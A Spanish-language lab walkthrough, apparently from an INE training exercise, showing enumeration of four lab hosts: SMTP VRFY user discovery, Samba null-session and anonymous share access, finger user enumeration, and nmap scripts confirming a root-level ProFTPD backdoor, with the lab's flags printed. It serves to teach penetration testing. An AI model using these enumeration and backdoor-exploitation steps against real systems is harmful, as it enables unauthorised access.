
# Enumeración en Linux

## <mark style="color:purple;">Lab</mark>

Este laboratorio te ayudará a comprender cómo realizar una enumeración en sistemas Linux remotos para encontrar servicios vulnerables y usuarios válidos, y a enumerar los beneficios de encontrar información valiosa.

En este entorno de laboratorio, el usuario accederá a una instancia de Kali GUI. Deberá realizar una enumeración en las máquinas objetivo para encontrar los usuarios válidos y los servicios vulnerables. Además, deberá encontrar las flags en dichas máquinas.

* <http://demo.ine.local>
* <http://demo2.ine.local>
* <http://demo3.ine.local>
* <http://demo4.ine.local>

#### Diccionarios a utilizar

* &#x20;**/usr/share/metasploit-framework/data/wordlists/common\_users.txt**&#x20;
* **/usr/share/metasploit-framework/data/wordlists/unix\_users.txt**

***

**Objetivo:** Realizar diferentes técnicas de enumeración en las máquinas objetivo para encontrar usuarios válidos y servicios vulnerables.

### Hosts

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.11       INE
127.0.0.1 AttackDefense-Kali
192.128.83.2    INE
192.128.83.2 INE
192.128.83.3 demo.ine.local
192.128.83.4 demo2.ine.local
192.128.83.5 demo3.ine.local
192.128.83.6 demo4.ine.local
```

### Escaneo de red externa

```bash
┌──(root㉿INE)-[~]
└─# nmap -sn 192.128.83.0/24

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-23 00:05 IST
Nmap scan report for 192.128.83.1
Host is up (0.000043s latency).
MAC Address: 02:42:E6:27:3C:41 (Unknown)
Nmap scan report for demo.ine.local (192.128.83.3)
Host is up (0.000020s latency).                                                                                                                                       
MAC Address: 02:42:C0:80:53:03 (Unknown)                                                                                                                              
Nmap scan report for demo2.ine.local (192.128.83.4)                                                                                                                   
Host is up (0.000023s latency).
MAC Address: 02:42:C0:80:53:04 (Unknown)
Nmap scan report for demo3.ine.local (192.128.83.5)
Host is up (0.000024s latency).
MAC Address: 02:42:C0:80:53:05 (Unknown)
Nmap scan report for demo4.ine.local (192.128.83.6)
Host is up (0.000030s latency).
MAC Address: 02:42:C0:80:53:06 (Unknown)
```

Vemos que efectivamente hay 4 máquinas en la red. Guardaremos los objetivos en un archivo `targets.txt`:

```bash
cat targets.txt

demo.ine.local
demo2.ine.local
demo3.ine.local
demo4.ine.local
```

### Escaneo de objetivos

```bash
──(root㉿INE)-[~]
└─# nmap -sV -T4 -iL targets.txt

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-23 00:10 IST
Nmap scan report for demo.ine.local (192.128.83.3)
Host is up (0.000029s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
MAC Address: 02:42:C0:80:53:03 (Unknown)

Nmap scan report for demo2.ine.local (192.128.83.4)
Host is up (0.000029s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
MAC Address: 02:42:C0:80:53:04 (Unknown)
Service Info: Host: SAMBA-RECON

Nmap scan report for demo3.ine.local (192.128.83.5)
Host is up (0.000028s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
79/tcp open  finger  Linux fingerd
MAC Address: 02:42:C0:80:53:05 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for demo4.ine.local (192.128.83.6)
Host is up (0.000028s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
MAC Address: 02:42:C0:80:53:06 (Unknown)
Service Info: OS: Unix
```

***

## <mark style="color:purple;">Host 1</mark>

```
demo.ine.local
```

#### 🖥️ demo.ine.local (192.128.83.3)

* **25/tcp – SMTP (Postfix)**\
  👉 Servicio de correo\
  💡 Posible vector:
* Enumeración de usuarios (VRFY, EXPN)
* Open relay

### Enumeración SMTP

{% content-ref url="/pages/o3lTcldCu7rwocSYG66V" %}
[SMTP](/ethical-hacking-cheatsheet/recopilacion-de-informacion/enumeracion/smtp.md)
{% endcontent-ref %}

```bash
┌──(root㉿INE)-[~]
└─# nmap --script smtp-* -p 25 demo.ine.local

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server doesn't seem to be an open relay, all tests failed
|_smtp-commands: demo.ine.local, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
| smtp-enum-users: 
|   root
|   administrator
|_  sysadmin
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
MAC Address: 02:42:C0:80:53:03 (Unknown)
```

### Enumerar usuarios SMTP

```bash
┌──(root㉿INE)-[~]
└─# smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/common_users.txt -t demo.ine.local                                                       

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/metasploit-framework/data/wordlists/common_users.txt
Target count ............. 1
Username count ........... 7
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Mon Mar 23 00:19:03 2026 #########
demo.ine.local: demo exists
demo.ine.local: sysadmin exists
demo.ine.local: auditor exists
demo.ine.local: rooty exists
demo.ine.local: anon exists
demo.ine.local: administrator exists
demo.ine.local: diag exists
######## Scan completed at Mon Mar 23 00:19:03 2026 #########
7 results.

7 queries in 1 seconds (7.0 queries / sec)
```

Encontramos 7 usuarios que guardaremos en un archivo `users.txt`.

```bash
echo -e "demo\nsysadmin\nauditor\nrooty\nanon\nadministrator\ndiag" > users.txt
```

Por el momento seguiremos con otros hosts.

***

## <mark style="color:purple;">Host 2</mark>

```
demo2.ine.local
```

#### 🖥️ demo2.ine.local (192.128.83.4)

* **139/tcp – NetBIOS (Samba)**
* **445/tcp – SMB (Samba 3.X - 4.X)**

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV -p 139,445 demo2.ine.local 

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: RECONLABS)
```

### Enumerar usuarios

#### Enum4linux

Usaremos enum4linux para enumerar usuarios:

```bash
┌──(root㉿INE)-[~]
└─# enum4linux -r demo2.ine.local | grep "Local User"

S-1-5-21-4056189605-2085045094-1961111545-501 SAMBA-RECON\nobody (Local User)
S-1-5-21-4056189605-2085045094-1961111545-1000 SAMBA-RECON\john (Local User)
S-1-5-21-4056189605-2085045094-1961111545-1001 SAMBA-RECON\shawn (Local User)
S-1-5-21-4056189605-2085045094-1961111545-1002 SAMBA-RECON\elie (Local User)
S-1-5-21-4056189605-2085045094-1961111545-1003 SAMBA-RECON\emma (Local User)
S-1-5-21-4056189605-2085045094-1961111545-1004 SAMBA-RECON\aisha (Local User)
S-1-5-21-4056189605-2085045094-1961111545-1005 SAMBA-RECON\admin (Local User)
```

Encontramos 7 usuarios!

#### RPCclient

Como alternativa podríamos usar `rpcclient` con una null session para enumerar usuarios, grupos, etc...

```bash
┌──(root㉿INE)-[~]
└─# rpcclient -U "" demo2.ine.local     
                                                                                                                              
Password for [WORKGROUP\]:

rpcclient $> enumdomusers
user:[john] rid:[0x3e8]
user:[elie] rid:[0x3ea]
user:[aisha] rid:[0x3ec]
user:[shawn] rid:[0x3e9]
user:[emma] rid:[0x3eb]
user:[admin] rid:[0x3ed]

rpcclient $> enumdomgroups
group:[Maintainer] rid:[0x3ee]
group:[Reserved] rid:[0x3ef]

rpcclient $> enumdomains
name:[SAMBA-RECON] idx:[0x0]
name:[Builtin] idx:[0x1]

rpcclient $> queryuser admin
        User Name   :   admin
        Full Name   :
        Home Drive  :   \\samba-recon\admin
        Dir Drive   :
        Profile Path:   \\samba-recon\admin\profile
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Thu, 01 Jan 1970 05:30:00 IST
        Logoff Time              :      Wed, 06 Feb 2036 20:36:39 IST
        Kickoff Time             :      Wed, 06 Feb 2036 20:36:39 IST
        Password last set Time   :      Tue, 27 Nov 2018 19:06:13 IST
        Password can change Time :      Tue, 27 Nov 2018 19:06:13 IST
        Password must change Time:      Thu, 14 Sep 30828 08:18:05 IST
        unknown_2[0..31]...
        user_rid :      0x3ed
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
```

### Enumerar Shares

```bash
┌──(root㉿INE)-[~]
└─# smbclient -L //demo2.ine.local -N

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk      
        john            Disk      
        aisha           Disk      
        emma            Disk      
        everyone        Disk      
        IPC$            IPC       IPC Service (samba.recon.lab)
        
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            SAMBA-RECON
```

Vemos que tenemos varios shares, vamos a enumerarlos un poco más con nmap:

```bash
┌──(root㉿INE)-[~]
└─# nmap --script smb-enum-shares -p 445 demo2.ine.local     
                                                                                                         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-23 00:36 IST
Nmap scan report for demo2.ine.local (192.128.83.4)
Host is up (0.000057s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:42:C0:80:53:04 (Unknown)

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\192.128.83.4\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (samba.recon.lab)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
<-----SNIP----->
|   \\192.128.83.4\public: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\public
|     Anonymous access: READ/WRITE
|_    Current user access: READ/WRITE
```

A los únicos que tenemos acceso de lectura y escritura son IPC$ y public.

### SMB Anonymous Login

```bash
┌──(root㉿INE)-[~]
└─# smbclient -N \\\\demo2.ine.local\\public -U ""

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 23 00:36:01 2026
  ..                                  D        0  Tue Nov 27 19:06:13 2018
  secret                              D        0  Tue Nov 27 19:06:13 2018
  dev                                 D        0  Tue Nov 27 19:06:13 2018
```

Encontramos 2 directorios interesantes, en `secret` tenemos la flag, y en dev no hay nada:

```bash
smb: \> cd secret\
smb: \secret\> ls
  .                                   D        0  Tue Nov 27 19:06:13 2018
  ..                                  D        0  Mon Mar 23 00:36:01 2026
  flag                                N       33  Tue Nov 27 19:06:13 2018

                1981311780 blocks of size 1024. 90025428 blocks available

smb: \secret\> get flag
getting file \secret\flag of size 33 as flag (16.1 KiloBytes/sec) (average 16.1 KiloBytes/sec)
```

```bash
┌──(root㉿INE)-[~]
└─# cat flag                                                                                                                                                          
03ddb97933e716f5057a18632badb3b4
```

***

## <mark style="color:purple;">Host 3</mark>

```
demo3.ine.local
```

#### 🖥️ demo3.ine.local (192.128.83.5)

* **79/tcp – Finger (Linux fingerd)**

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV demo3.ine.local
                                                                                                                           
PORT   STATE SERVICE VERSION
79/tcp open  finger  Linux fingerd
```

### Enumeración de Finger

```bash
msfconsole

use auxiliary/scanner/finger/finger_users
set rhosts demo3.ine.local
exploit

[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: admin
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: administrator
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: _apt
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: backup
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: bin
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: daemon
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: dbadmin
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: diag
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: games
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: gnats
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: gopher
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: irc
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: list
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: lp
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: mail
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: man
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: news
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: nobody
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: proxy
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: systemd-bus-proxy
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: root
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: saned
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: sync
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: sys
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: systemd-network
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: systemd-resolve
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: systemd-timesync
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: udadmin
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: uucp
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: webmaster
[+] 192.128.83.5:79       - 192.128.83.5:79 - Found user: www-data
```

Encontramos multitud de usuarios, muchos propios del sistema.

Alternativamente podríamos usar el siguiente script, aunque el output no es tan bueno como en Metasploit:

{% embed url="<https://github.com/pentestmonkey/finger-user-enum>" %}

### Enumerar usuario Finger

Usaremos el siguiente comando para obtener información en detalle de los usuarios, y concretamente en el usuario `diag` nos encontramos una flag 2:

```bash
┌──(root㉿INE)-[~/Desktop/tools]
└─# finger diag@demo3.ine.local
                                                                                                                                  
Login: diag                             Name: Flag2 F765F7A0A169F4F6654EE72A84A9EB
Directory: /home/diag                   Shell: /bin/bash
Office: 353, 567-537-1198               Home Phone: 410-364-2969
Never logged in.
No mail.
No Plan.
```

Y con `webmaster` encontramos la flag 3:

```bash
┌──(root㉿INE)-[~/Desktop/tools]
└─# finger webmaster@demo3.ine.local
                                                                                                                     
Login: webmaster                        Name: Flag3 C4CA4238A0B923820DCC509A6F75849B
Directory: /home/webmaster              Shell: /bin/bash
Office: 65, 318-240-8507                Home Phone: 608-848-1401
Never logged in.
No mail.
No Plan.
```

***

## <mark style="color:purple;">Host 4</mark>

```
demo4.ine.local
```

#### 🖥️ demo4.ine.local (192.128.83.6)

* **21/tcp – FTP (ProFTPD 1.3.3c)**

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV demo4.ine.local

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
```

### Enumeración FTP

Tenemos los siguiente scripts FTP que podemos usar con nmap:

```bash
┌──(root㉿INE)-[~]
└─# ls -la /usr/share/nmap/scripts/ | grep ftp

-rw-r--r-- 1 root root  4530 Jun 20  2024 ftp-anon.nse
-rw-r--r-- 1 root root  3253 Jun 20  2024 ftp-bounce.nse
-rw-r--r-- 1 root root  3108 Jun 20  2024 ftp-brute.nse
-rw-r--r-- 1 root root  3272 Jun 20  2024 ftp-libopie.nse
-rw-r--r-- 1 root root  3290 Jun 20  2024 ftp-proftpd-backdoor.nse
-rw-r--r-- 1 root root  3768 Jun 20  2024 ftp-syst.nse
-rw-r--r-- 1 root root  6021 Jun 20  2024 ftp-vsftpd-backdoor.nse
-rw-r--r-- 1 root root  5923 Jun 20  2024 ftp-vuln-cve2010-4221.nse
-rw-r--r-- 1 root root  5736 Jun 20  2024 tftp-enum.nse
-rw-r--r-- 1 root root 10034 Jun 20  2024 tftp-version.nse
```

Los podemos ejecutar todos con el siguiente comando:

```bash
┌──(root㉿INE)-[~]
└─# nmap -p 21 --script ftp-* demo4.ine.local

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-proftpd-backdoor: 
|   This installation has been backdoored.
|   Command: id
|_  Results: uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
| ftp-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 19737 guesses in 600 seconds, average tps: 33.2
MAC Address: 02:42:C0:80:53:06 (Unknown)
```

Vemos que es vulnerable al módulo `ftp-proftpd-backdoor` , con el que conseguimos explotar un comando con el que podríamos conseguir root, confirmando la vulnerabilidad.
